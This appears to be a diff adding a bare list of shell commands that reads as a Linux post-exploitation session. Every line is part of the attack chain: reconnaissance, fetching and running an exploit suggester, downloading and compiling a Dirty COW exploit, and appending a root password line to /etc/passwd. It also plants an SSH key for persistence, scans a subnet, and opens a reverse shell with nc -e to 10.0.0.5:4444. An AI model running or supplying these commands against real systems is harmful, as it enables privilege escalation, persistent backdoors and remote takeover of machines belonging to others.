@@ -1,0 +1,23 @@
+whoami
+uname -a
+cat /etc/passwd
+ls -la /var/www
+cd /var/www
+ls -la
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+chmod +x les.sh
+./les.sh
+wget https://exploit-db.com/download/40639 -O dirtycow.c
+gcc dirtycow.c -o dirtycow
+./dirtycow
+whoami
+id
+touch /tmp/pwned
+echo "root:P@ssw0rd" >> /etc/passwd
+su - root
+mkdir -p ~/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+nmap -sV 10.0.0.1/24 -oN scan_results.txt
+nc -e /bin/bash 10.0.0.5 4444
+exit
